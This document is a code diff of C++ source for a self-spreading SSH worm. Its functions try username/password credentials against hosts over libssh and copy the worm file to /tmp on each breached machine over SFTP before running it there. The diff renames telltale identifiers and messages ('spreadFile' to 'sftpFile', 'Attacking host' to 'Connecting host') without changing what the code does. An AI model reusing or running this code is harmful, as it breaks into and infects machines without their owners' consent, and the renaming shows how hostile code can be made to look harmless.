@@ -416,36 +416,36 @@ int tryCredential(ssh_session &sshClient, const string host, const Credential cr
 
     sshClient = ssh_new();
     if (sshClient == NULL) {
-        perror("attackSystem: unable to initialize sshClient\n");
+        perror("tryCredential: unable to initialize sshClient\n");
         return -1;
     }
 
     // Set the host
     if (ssh_options_set(sshClient, SSH_OPTIONS_HOST, host.c_str()) < 0) {
-        perror("attackSystem: unable to set host\n");
+        perror("tryCredential: unable to set host\n");
         ssh_free(sshClient);
         return -1;
     }
 
     // Set the port
     if (ssh_options_set(sshClient, SSH_OPTIONS_PORT, &port) < 0) {
-        perror("attackSystem: unable to set port\n");
+        perror("tryCredential: unable to set port\n");
         ssh_free(sshClient);
         return -1;
     }
 
     // Set the user
     if (ssh_options_set(sshClient, SSH_OPTIONS_USER, user) < 0) {
-        perror("attackSystem: unable to set user\n");
+        perror("tryCredential: unable to set user\n");
         ssh_free(sshClient);
         return -1;
     }
 
-    printf("Attacking host: %s with %s/%s...\n", host.c_str(), user, pass);
+    printf("Connecting host: %s with %s/%s...\n", host.c_str(), user, pass);
 
     // Connect to server
     if (ssh_connect(sshClient) != SSH_OK) {
-        printf("Error connect to host %s\n", ssh_get_error(sshClient));
+        printf("tryCredential: Error connect to host %s\n", ssh_get_error(sshClient));
         ssh_disconnect(sshClient);
         ssh_free(sshClient);
         return -1;
@@ -453,7 +453,7 @@ int tryCredential(ssh_session &sshClient, const string host, const Credential cr
 
     // Check for known hosts
     if (sshVerifyKnownHost(sshClient) < 0) {
-        perror("Failed verify known host\n");
+        perror("tryCredential: Failed verify known host\n");
         ssh_disconnect(sshClient);
         ssh_free(sshClient);
         return -1;
@@ -463,7 +463,7 @@ int tryCredential(ssh_session &sshClient, const string host, const Credential cr
     int ReturnCode = ssh_userauth_password(sshClient, NULL, pass);
 
     if (ReturnCode == SSH_AUTH_ERROR) {
-        printf("attackSystem: Something wrong. %s\n", ssh_get_error(sshClient));
+        printf("tryCredential: Something wrong. %s\n", ssh_get_error(sshClient));
     } else if (ReturnCode == SSH_AUTH_DENIED) {
         printf("Invalid Credential.  Denied\n");
         success = false;
@@ -508,13 +508,13 @@ ssh_session attackSystem(const string host) {
 }
 
 /*******************************************************************************
- * Function: spreadFile
+ * Function: sftpFile
  * @param sshClient an active ssh session
  * @param source is a string contain the path to the source file
  * @param target is a string contain the path of the target file
  * @return 0 if success or -1 if fail
  ******************************************************************************/
-int spreadFile(ssh_session &sshClient, char *source, char *target) {
+int sftpFile(ssh_session &sshClient, char *source, char *target) {
 
     // The return code
     int rc;
@@ -532,7 +532,7 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     sftp_session sftp = sftp_new(sshClient);
 
     if (sftp == NULL) {
-        perror("spreadFile: Unable to create sftp session\n");
+        perror("sftpFile: Unable to create sftp session\n");
         return -1;
     }
 
@@ -541,21 +541,21 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     if (rc != SSH_OK) {
         // Free the memory for the sftp structure
         sftp_free(sftp);
-        perror("spreadFile: Unable to initialize sftp session\n");
+        perror("sftpFile: Unable to initialize sftp session\n");
         return -1;
     }
 
     // Open the worm file for reading
     FILE* localFile = fopen(source, "r");
     if (!localFile) {
-        perror("spreadFile: Unable to open source file with fopen\n");
+        perror("sftpFile: Unable to open source file with fopen\n");
         return -1;
     }
 
     // Open the remote file for writing
     remoteFile = sftp_open(sftp, target, access_type, S_IRWXU);
     if (remoteFile == NULL) {
-        perror("spreadFile: Unable to open remote file for writing\n");
+        perror("sftpFile: Unable to open remote file for writing\n");
         return -1;
     }
 
@@ -565,12 +565,12 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     int readByte, writeByte;
     while (!feof(localFile)) {
         if ( (readByte = fread(buffer, sizeof(char), SIZE, localFile)) < 0 ) {
-            perror("spreadFile: Error reading local file\n");
+            perror("sftpFile: Error reading local file\n");
             return -1;
         }
         writeByte = sftp_write(remoteFile, buffer, readByte);
         if (writeByte != readByte) {
-            perror("spreadFile: Error writing to remote file\n");
+            perror("sftpFile: Error writing to remote file\n");
             return -1;
         }
     }
@@ -582,7 +582,7 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     rc = sftp_close(remoteFile);
     if (rc != SSH_OK)
     {
-        perror("spreadFile: Unable to close remote file\n");
+        perror("sftpFile: Unable to close remote file\n");
         return -1;
     }
 
@@ -658,7 +658,7 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     sprintf(destName, "/tmp/%s", basename(sourceName));
 
     // Spread the file
-    if (spreadFile(sshClient, sourceName, destName) != 0) {
+    if (sftpFile(sshClient, sourceName, destName) != 0) {
         perror("spreadAndExecute: not able to spread worm\n");
         return -1;
     }
